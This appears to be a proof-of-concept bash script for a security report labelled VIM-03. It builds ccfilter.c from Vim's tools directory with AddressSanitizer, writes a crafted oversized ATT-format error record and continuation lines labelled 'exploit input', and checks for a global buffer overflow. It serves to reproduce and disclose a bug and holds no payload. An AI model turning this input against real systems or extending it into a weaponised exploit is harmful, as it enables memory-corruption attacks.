#!/bin/bash
# =============================================================================
# VIM-03 Build & Reproduce Script
# Reproduces BSS buffer overflow in ccfilter.c (Vim 9.2 tools/)
# Requires: Linux, GCC with ASAN support
# Usage:    bash build_and_reproduce.sh [/path/to/ccfilter.c]
# =============================================================================

set -e

CCFILTER_SRC="${1:-./ccfilter_v02.01.01.c}"
WORKDIR="/tmp/vim03_repro_$$"
mkdir -p "$WORKDIR"

echo "========================================================"
echo " VIM-03: ccfilter.c BSS Buffer Overflow Reproduction"
echo "========================================================"
echo ""

# --- Step 1: Verify source ---
if [ ! -f "$CCFILTER_SRC" ]; then
    echo "[ERROR] Source not found: $CCFILTER_SRC"
    echo "Usage: $0 /path/to/ccfilter.c"
    exit 1
fi

echo "[1/5] Source file: $CCFILTER_SRC"
echo "      Version: $(grep 'Version:' "$CCFILTER_SRC" | head -1 | xargs)"
cp "$CCFILTER_SRC" "$WORKDIR/ccfilter.c"

# --- Step 2: Compile plain binary ---
echo ""
echo "[2/5] Compiling standard binary..."
gcc -g -o "$WORKDIR/ccfilter_plain" "$WORKDIR/ccfilter.c" 2>&1 | \
    grep -v "^$" || true
echo "      Plain binary: $WORKDIR/ccfilter_plain  [OK]"

# --- Step 3: Compile ASAN binary ---
echo ""
echo "[3/5] Compiling ASAN + UBSAN instrumented binary..."
gcc -fsanitize=address,undefined \
    -g \
    -fno-omit-frame-pointer \
    -o "$WORKDIR/ccfilter_asan" \
    "$WORKDIR/ccfilter.c" 2>&1 | grep -v "^$" || true
echo "      ASAN binary:  $WORKDIR/ccfilter_asan  [OK]"
ls -la "$WORKDIR/ccfilter_asan"

# --- Step 4: Generate exploit input ---
echo ""
echo "[4/5] Generating exploit input..."

# ATT format: <severity> "<filename>",L<row>/C<col>: <reason>\n
# Severity: e (error), w (warning), i (info)
# Fill Reason with 2000 A's via initial line
REASON_FILL=$(python3 -c "print('A' * 2000)")

# First line: valid ATT error record with large Reason field
EXPLOIT_INPUT="$WORKDIR/exploit_input.txt"

{
    echo "e \"poc_vim03.c\",L1/C1: ${REASON_FILL}"
    # 10 continuation lines starting with '| ' — each adds 202 bytes (": " + 200 B's)
    for i in $(seq 1 10); do
        printf "| %s\n" "$(python3 -c "print('B' * 200, end='')")"
    done
    echo "make[1]: Entering directory \`/tmp/test'"
} > "$EXPLOIT_INPUT"

echo "      Input file:   $EXPLOIT_INPUT"
echo "      Size:         $(wc -c < "$EXPLOIT_INPUT") bytes"
echo "      Lines:        $(wc -l < "$EXPLOIT_INPUT") lines"
echo "      First 80 chars of line 1:"
head -c 80 "$EXPLOIT_INPUT"; echo "..."

# --- Step 5: Execute and capture ASAN output ---
echo ""
echo "[5/5] Running ASAN binary with exploit input..."
echo "      (expecting global-buffer-overflow crash)"
echo ""

ASAN_LOG="$WORKDIR/asan_crash_log.txt"
export ASAN_OPTIONS="halt_on_error=1:abort_on_error=1:log_path=$WORKDIR/asan"

# Run — we expect exit code != 0
set +e
"$WORKDIR/ccfilter_asan" -o ATT < "$EXPLOIT_INPUT" > "$WORKDIR/output.txt" 2> "$ASAN_LOG"
EXIT_CODE=$?
set -e

echo "      Exit code: $EXIT_CODE"

# --- Verify crash ---
echo ""
echo "========================================================"
echo " RESULTS"
echo "========================================================"

if grep -q "global-buffer-overflow" "$ASAN_LOG" 2>/dev/null; then
    echo "[+] CONFIRMED: AddressSanitizer detected global-buffer-overflow"
    echo ""
    grep -A5 "global-buffer-overflow" "$ASAN_LOG" | head -20
    echo ""
    echo "[+] Full ASAN log: $ASAN_LOG"
elif [ $EXIT_CODE -ne 0 ]; then
    echo "[+] Process crashed with exit code $EXIT_CODE"
    echo "    (compile with ASAN for detailed report)"
else
    echo "[-] No crash observed — check input format"
fi

# Also check for ASAN log files written via log_path
for f in "$WORKDIR"/asan.*; do
    if [ -f "$f" ]; then
        echo "[+] ASAN log file: $f"
        grep -A3 "ERROR\|SUMMARY" "$f" || true
    fi
done

echo ""
echo "Files in workdir:"
ls -la "$WORKDIR/"
